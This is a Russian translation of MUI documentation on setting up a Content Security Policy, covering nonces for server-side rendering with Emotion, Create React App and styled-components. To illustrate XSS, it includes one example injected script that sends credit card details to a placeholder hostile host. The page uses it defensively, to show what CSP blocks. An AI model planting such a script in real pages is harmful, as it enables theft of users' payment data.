

# Политика безопасности содержимого (CSP) <meta data-oversett="" data-original-text="Content Security Policy (CSP)">

<p class="description">В этом разделе рассматриваются подробности настройки CSP.</p>

## Что такое CSP и почему она полезна? <meta data-oversett="" data-original-text="What is CSP and why is it useful?">

CSP смягчает атаки межсайтового скриптинга (XSS), требуя от разработчиков вносить в белый список источники, из которых извлекаются их активы. Этот список возвращается в виде заголовка с сервера. Например, если у вас есть сайт, расположенный по адресу `https://example.com`, CSP-заголовок `default-src: 'self';` будет разрешать все активы, расположенные по адресу `https://example.com/*`, и запрещать все остальные. Если на вашем сайте есть раздел, уязвимый к XSS, где отображается пользовательский ввод без расшифровки, злоумышленник может ввести что-то вроде:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Эта уязвимость позволит злоумышленнику выполнить все, что угодно. Однако при наличии безопасного заголовка CSP браузер не загрузит этот сценарий.

Вы можете прочитать больше о CSP в [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Как реализовать CSP? <meta data-oversett="" data-original-text="How does one implement CSP?">

### Рендеринг на стороне сервера (SSR) <meta data-oversett="" data-original-text="Server-Side Rendering (SSR)">

Чтобы использовать CSP с MUI (и эмоциями), вам нужно использовать nonce. Nonce - это случайно сгенерированная строка, которая используется только один раз, поэтому вам нужно добавить серверное промежуточное ПО для генерации nonce при каждом запросе.

CSP nonce - это строка, закодированная в Base 64. Вы можете сгенерировать его следующим образом:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Вы должны использовать UUID версии 4, так как он генерирует **непредсказуемую** строку. Затем вы применяете этот nonce к заголовку CSP. Заголовок CSP может выглядеть следующим образом с примененным кодом:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);
```

Вы должны передать nonce в тегах `<style>` на сервере.

```jsx
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>
```

Затем вы должны передать этот nonce в кэш Emotion, чтобы он мог добавить его в последующие `<style>`.

:::warning
Если вы использовали `StyledEngineProvider` с `injectFirst`, вам нужно будет заменить его на `CacheProvider` из Emotion и добавить опцию `prepend: true`.
:::

```js
const cache = createCache({
  key: 'my-prefix-key',
  nonce: nonce,
  prepend: true,
});

function App(props) {
  return (
    <CacheProvider value={cache}>
      <Home />
    </CacheProvider>
  );
}
```

### Создание React App (CRA) <meta data-oversett="" data-original-text="Create React App (CRA)">

Согласно [документации Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), Create React App по умолчанию динамически внедряет сценарий выполнения в index.html во время сборки. Это потребует установки нового хэша в вашем CSP во время каждого развертывания.

Чтобы использовать CSP с проектом, инициализированным как Create React App, вам нужно установить переменную `INLINE_RUNTIME_CHUNK=false` в файле `.env`, используемом для производственной сборки. Это позволит импортировать сценарий выполнения как обычно, а не встраивать его, избегая необходимости устанавливать новый хэш при каждом развертывании.

### styled-components <meta data-oversett="" data-original-text="styled-components">

Конфигурация nonce не является простой, но вы можете проследить за [этим вопросом](https://github.com/styled-components/styled-components/issues/2363), чтобы получить больше информации.
